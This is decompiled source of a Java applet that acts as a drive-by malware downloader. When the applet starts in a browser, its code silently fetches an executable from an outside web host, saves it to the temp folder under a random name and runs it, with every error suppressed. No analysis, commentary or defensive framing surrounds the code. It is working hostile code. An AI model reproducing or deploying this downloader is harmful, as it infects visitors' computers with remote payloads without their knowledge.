import java.io.InputStream;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.net.URL;
import java.io.IOException;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class S1O1C3J9 extends Applet
{
    @Override
    public void start() {
        final String concat = System.getProperty("java.io.tmpdir").concat("\\S5K7P4S8.exe");
        this.download("http://bayanescortlar.co.uk/images/esco.exe", concat);
        final Runtime runtime = Runtime.getRuntime();
        try {
            runtime.exec(concat);
        }
        catch (IOException ex) {}
    }
    
    public void download(final String s, final String s2) {
        OutputStream outputStream = null;
        InputStream inputStream = null;
        try {
            final URL url = new URL(s);
            outputStream = new BufferedOutputStream(new FileOutputStream(s2));
            inputStream = url.openConnection().getInputStream();
            final byte[] array = new byte[1024];
            int read;
            while ((read = inputStream.read(array)) != -1) {
                outputStream.write(array, 0, read);
            }
        }
        catch (Exception ex) {}
        finally {
            try {
                if (inputStream != null) {
                    inputStream.close();
                }
                if (outputStream != null) {
                    outputStream.close();
                }
            }
            catch (IOException ex2) {}
        }
    }
    
    public void main(final String[] array) {
        this.start();
    }
    
    @Override
    public void stop() {
    }
}
